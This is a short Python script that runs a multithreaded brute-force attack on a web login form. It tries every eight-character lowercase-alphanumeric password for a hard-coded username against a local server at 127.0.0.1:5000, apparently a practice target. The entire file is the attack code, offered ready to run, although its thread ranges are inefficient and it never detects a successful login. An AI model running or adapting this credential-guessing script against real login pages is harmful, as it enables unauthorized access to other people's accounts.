import itertools
import requests
import threading
def attack(password):
    username = "sherill"
    session = requests.Session()
    login_page = session.get("http://127.0.0.1:5000")
    login_data = {
        "username": username,
        "password": password,
    }
    login_response = session.post("http://127.0.0.1:5000", data=login_data)
    print(login_response.text)

def generate_combinations(start_index, end_index):
    # Generate the combinations for the given range
    combinations = itertools.product(characters, repeat=8)
    for i, combination in enumerate(combinations):
        # Only print the combination if it's within the specified range
        if start_index <= i < end_index:
            print("".join(combination))
            attack("".join(combination))


if __name__ == "__main__":
    try:
        num_threads = 10
        characters = "abcdefghijklmnopqrstuvwxyz0123456789"
        # Calculate the number of combinations per thread
        num_combinations = len(characters) ** 8
        combinations_per_thread = num_combinations // num_threads #Floor Division

        # Create and start the threads
        threads = []
        for i in range(num_threads):
            start_index = i * combinations_per_thread
            end_index = start_index + combinations_per_thread
            thread = threading.Thread(target=generate_combinations, args=(start_index, end_index))
            threads.append(thread)
            thread.start()

        # Wait for the threads to finish
        for thread in threads:
            thread.join()

    except (KeyboardInterrupt, SystemExit):
        print ('\n! Received keyboard interrupt, quitting threads.\n')